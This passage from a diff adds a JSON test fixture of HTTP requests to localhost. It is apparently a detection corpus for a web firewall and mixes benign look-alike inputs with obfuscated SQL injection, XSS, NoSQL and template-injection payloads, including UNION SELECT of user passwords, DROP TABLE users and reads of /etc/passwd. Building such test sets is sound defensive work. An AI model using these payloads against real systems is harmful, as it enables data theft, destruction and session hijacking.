+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 AND BENCHMARK(1000000,MD5(1))"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 228 (arg name)",
+    "method": "GET",
+    "uri": "/item?It%27s%205%20o%27clock=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 229 (arg name)",
+    "method": "GET",
+    "uri": "/item?1%2F%2A%2A%2FOR%2F%2A%2A%2F1%20%3D%201=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 230 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%27%20OR%20%271%27%3D%271",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 231 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3Balert%28String.fromCharCode%2888%29%29%2F%2F",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 232 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "82"
+      ]
+    ],
+    "body": "comment=%5C7b%20%5C%5C34%202%24%5C6e%20%5C65%20%22%5C72%20nul%5C%5C78%206c%7D&ok=1"
+  },
+  {
+    "name": "injection variant 233 (path)",
+    "method": "GET",
+    "uri": "/page/price%3A%2010-20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 234 (arg name)",
+    "method": "GET",
+    "uri": "/item?%27%3Balert%28String.fromCharCode%2888%29%29%2F%2F=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 235 (path)",
+    "method": "GET",
+    "uri": "/page/a%20%3C%20b%20and%20b%20%3E%20c",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 236 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%2520load_file%2528%2527%252Fetc%252Fpasswd%2527%2529",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 237 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 238 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1%3b WAITFOR DELAY '0:0:5'"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 239 (path)",
+    "method": "GET",
+    "uri": "/page/1%2F%2Ax%2A%2FUNION%2F%2Ax%2A%2FSELECT%2F%2Ax%2A%2Fusername%2C%2F%2Ax%2A%2Fpassword%2F%2Ax%2A%2FFROM%2F%2Ax%2A%2Fusers",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 240 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%3B%20DROP%20TABLE%20users--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 241 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%09load_file%28%27%2Fetc%2Fpasswd%27%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 242 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "171"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\\\\x64oc\\\\u0075m\\\\u0065\\\\u006e\\\\164.write(\\\\47<\\\\u0062>\\\\u0027\\\\51\"}, \"tags\": [\"a\", \"\\\\x64oc\\\\u0075m\\\\u0065\\\\u006e\\\\164.write(\\\\47<\\\\u0062>\\\\u0027\\\\51\"]}"
+  },
+  {
+    "name": "injection variant 243 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "78"
+      ]
+    ],
+    "body": "comment=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&ok=1"
+  },
+  {
+    "name": "injection variant 244 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1/**/OR/**/1=1"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 245 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "44"
+      ]
+    ],
+    "body": "comment=%27%3B%20DROP%20TABLE%20users--&ok=1"
+  },
+  {
+    "name": "injection variant 246 (arg name)",
+    "method": "GET",
+    "uri": "/item?%27%3Balert%28String.fromCharCode%2888%29%29%2F%2F=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 247 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=\"><script>f\\65 t\\63 h(\\27 /\\2f x')</script\\3e "
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 248 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "68"
+      ]
+    ],
+    "body": "comment=%25257B%252522%252524ne%252522%25253A%252520null%25257D&ok=1"
+  },
+  {
+    "name": "injection variant 249 (query)",
+    "method": "GET",
+    "uri": "/item?id=JavAscRIpt%253aALErT%2528dOCUmENT.COokiE%2529",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 250 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "\\x7b\"$\\x6ee\"\\72 n\\x75ll}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 251 (query)",
+    "method": "GET",
+    "uri": "/item?id=%22%3E%3Cscript%3Efetch%28%27%2F%2Fx%27%29%3C%2Fscript%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 252 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "107"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1 A\\\\x4eD \\\\x53\\\\114EEP\\\\505\\\\x29\"}, \"tags\": [\"a\", \"1 A\\\\x4eD \\\\x53\\\\114EEP\\\\505\\\\x29\"]}"
+  },
+  {
+    "name": "injection variant 253 (query)",
+    "method": "GET",
+    "uri": "/item?id=select%20a%20colour",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 254 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cinput%0Aonfocus%3Dalert%281%29%0Aautofocus%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 255 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "141"
+      ]
+    ],
+    "body": "comment=%3C%5C64%20i%5C76%20%20st%5C79%20le%3D%5C22%20w%5C69%20dth%3Aexp%5C72%20es%5C73%20ion%28%5C61%20lert%28%5C31%20%29%5C29%20%22%3E&ok=1"
+  },
+  {
+    "name": "injection variant 256 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "script writing course"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 257 (arg name)",
+    "method": "GET",
+    "uri": "/item?select%20load_file%28%27%2Fetc%2Fpasswd%27%29=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 258 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1'\\20 AND ext\\72 \\61 \\63 \\74 value\\28 1,\\63 onc\\61 \\74 \\28 \\30 x7\\65 \\2c \\76 \\65 \\72 sion()))--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 259 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20and%20sLeeP%20%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 260 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref={\"$ne\": null}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 261 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "69"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"1/**/OR/**/1=1\"}, \"tags\": [\"a\", \"1/**/OR/**/1=1\"]}"
+  },
+  {
+    "name": "injection variant 262 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=\\u0031&#32%3bOR&#92%3bu0020pg\\u005fsle\\145&#92%3bu0070(&#92%3bx35&#x29%3b"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 263 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<input onfocus=alert(1) autofocus>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 264 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=h\\74 tps:/\\2f exa\\6d p\\6c \\65 &#46co\\6d \\26 #47a\\3f \\62 &#61c"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 265 (path)",
+    "method": "GET",
+    "uri": "/page/pr%5Cx69c%5C%5Cx365%20%3A%5C2%5Cx30%5Cx2010-%5Cx32%5C%5Cx330%20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 266 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cinput%09onfocus%3Dalert%281%29%09autofocus%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 267 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=javascript%3Aalert%28document.cookie%29"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 268 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=%3Csvg%2\\30 onlo\\61 d\\25 3Da\\6c ert%\\32 8\\31 %29%3E"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 269 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%3B%20wAiTFOR%20delay%20%270%3A0%3A5%27",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 270 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e1union%20select",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 271 (query)",
+    "method": "GET",
+    "uri": "/item?id=%27%5C20%20U%5C4e%20ION%20AL%5C4c%20%20S%5C45%20LECT%20N%5C55%20%5C4c%20L%2CNU%5C4c%20L%5C2d%20-",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 272 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%27%20%20OR%20%20%271%27%3D%271",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 273 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 274 (query)",
+    "method": "GET",
+    "uri": "/item?id=1e1union%20%20select",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 275 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "&lt;body&#32onload&#61eval&&#x23;x28;atob&#x28;'YQ&#38#61;=&&#x23;39&#41;)>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 276 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "\\x3ciframe\\u0020s\\u0072c=javascr\\151pt:alert\\50\\61)\\76"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 277 (query)",
+    "method": "GET",
+    "uri": "/item?id=kitap",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 278 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<sv\\67  on\\6c oa\\64 =aler\\74 (1)>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 279 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "<div style = \"width:expression (alert (1))\">"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 280 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "'||(SELECT 1 FROM dual)||'"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 281 (query)",
+    "method": "GET",
+    "uri": "/item?id=price%3A%2010-20",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 282 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "38"
+      ]
+    ],
+    "body": "comment=setTimeout%28alert%2C1%29&ok=1"
+  },
+  {
+    "name": "injection variant 283 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "109"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"';alert(String.fromCharCode(88))//\"}, \"tags\": [\"a\", \"';alert(String.fromCharCode(88))//\"]}"
+  },
+  {
+    "name": "injection variant 284 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Csvg%20onload%3Dalert%281%29%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 285 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "39"
+      ]
+    ],
+    "body": "comment=drop%2520me%2520a%2520line&ok=1"
+  },
+  {
+    "name": "injection variant 286 (path)",
+    "method": "GET",
+    "uri": "/page/%3Csvg%20onload%20%3D%20alert%20%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 287 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "91"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"The&#32;union of two sets\"}, \"tags\": [\"a\", \"The&#32;union of two sets\"]}"
+  },
+  {
+    "name": "injection variant 288 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "112"
+      ]
+    ],
+    "body": "comment=%3Ca%26%2332%3Bhref%3D%22javascript%3Aconfirm%281%26%2341%3B%26%23x22%3B%26%2362x%26%2360%3B%2Fa%3E&ok=1"
+  },
+  {
+    "name": "injection variant 289 (arg name)",
+    "method": "GET",
+    "uri": "/item?https%3A%2F%2Fexample.com%2Fa%3Fb%3Dc=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 290 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "78"
+      ]
+    ],
+    "body": "comment=%7B%7Bconstructor.constructor%28%27alert%281%29%27%29%28%29%7D%7D&ok=1"
+  },
+  {
+    "name": "injection variant 291 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "41"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\"}, \"tags\": [\"a\", \"\"]}"
+  },
+  {
+    "name": "injection variant 292 (path)",
+    "method": "GET",
+    "uri": "/page/%3Ca%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 293 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "33"
+      ]
+    ],
+    "body": "comment=drop%20me%20a%20line&ok=1"
+  },
+  {
+    "name": "injection variant 294 (path)",
+    "method": "GET",
+    "uri": "/page/%252527%25253B%252520DROP%252520TABLE%252520users--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 295 (query)",
+    "method": "GET",
+    "uri": "/item?id=%5Cu003c%5Cu0073vg%5C40onloa%5C144%3Da%5C154e%5Cx72t%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 296 (path)",
+    "method": "GET",
+    "uri": "/page/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 297 (arg name)",
+    "method": "GET",
+    "uri": "/item?The%20union%20of%20two%20sets=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 298 (query)",
+    "method": "GET",
+    "uri": "/item?id=It%27s%20%5C35%20%20o%27clock",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 299 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "147"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"\\\\x3cSCRipt>AlERT(1)<\\\\x2f\\\\u0073\\\\x63\\\\122\\\\u0049Pt>\"}, \"tags\": [\"a\", \"\\\\x3cSCRipt>AlERT(1)<\\\\x2f\\\\u0073\\\\x63\\\\122\\\\u0049Pt>\"]}"
+  },
+  {
+    "name": "injection variant 300 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 301 (query)",
+    "method": "GET",
+    "uri": "/item?id=script%252520writing%252520course",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 302 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ciframe%09src%3Djavascript%3Aalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 303 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%5C2f%20%2A%2A%5C2f%20OR%2F%2A%2A%2F1%3D1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 304 (path)",
+    "method": "GET",
+    "uri": "/page/%26%2339%3B%20DROP%26%2332%3BTABLE%20users%26%2345%26%2345%3B",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 305 (query)",
+    "method": "GET",
+    "uri": "/item?id=%5Cu003%5C143sc%5C%5C17072%5Cx69pt%5Cx3e%5Cx61%5C154e%5C162%5Cx74%5C501%29%5Cx3c%2F%5Cu00%5Cu0037%5C63%5C143ri%5Cu0070%5Cu0074%5Cx3e",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 306 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<A href=\"JAvasCrIpt:conFIrm(1)\">X</A>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 307 (json)",
